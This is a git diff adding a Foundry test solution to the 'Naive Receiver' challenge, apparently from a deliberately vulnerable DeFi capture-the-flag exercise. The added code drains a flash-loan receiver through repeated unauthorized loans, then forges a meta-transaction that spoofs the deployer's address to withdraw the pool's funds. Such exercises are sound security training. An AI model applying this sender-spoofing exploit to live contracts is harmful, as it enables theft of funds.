@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,41 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        console.log(weth.balanceOf(address(receiver)));
+        // drain FlashLoanReceiver
+        for (uint i = 0; i < 10; i++) {
+            pool.flashLoan(IERC3156FlashBorrower(receiver), address(weth), 1, "");
+        }
+        console.log(weth.balanceOf(address(receiver)));
+
+        bytes[] memory callDatas = new bytes[](1);
+        callDatas[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (weth.balanceOf(address(pool)), payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
         
+        bytes memory callData = abi.encodeCall(pool.multicall, callDatas);
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            10000000,
+            0,
+            callData,
+            block.timestamp + 1200
+        );
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        console.log(weth.balanceOf(address(pool)));
+        forwarder.execute(request, signature);
+        console.log(weth.balanceOf(address(pool)));
     }
 
     /**
